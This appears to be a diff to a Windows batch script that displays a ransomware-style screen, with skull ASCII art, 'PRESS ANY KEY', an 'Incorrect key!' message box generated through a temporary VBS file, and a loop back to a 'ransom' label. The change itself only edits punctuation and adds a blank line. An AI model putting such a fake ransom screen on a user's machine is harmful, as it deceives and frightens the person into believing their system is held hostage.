@@ -51,7 +51,7 @@ echo                                                 uuuu **$$$$$$$$$$uuu
 echo                                        u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
 echo                                        $$$$$$$$$$****           **$$$$$$$$$$$*
 echo                                          *$$$$$*                      **$$$$**
-echo                                            $$$*     PRESS ANY KEY      $$$$*
+echo                                            $$$*     PRESS ANY KEY^!    $$$$*
 echo '@
 echo.
 echo while^($true^) {
@@ -126,3 +126,4 @@ echo x=msgbox("Incorrect key^!",0,"Error 404") > "%cd%\error.vbs"
 cscript.exe //nologo "%cd%\error.vbs"
 del "%cd%\error.vbs"
 goto ransom
+
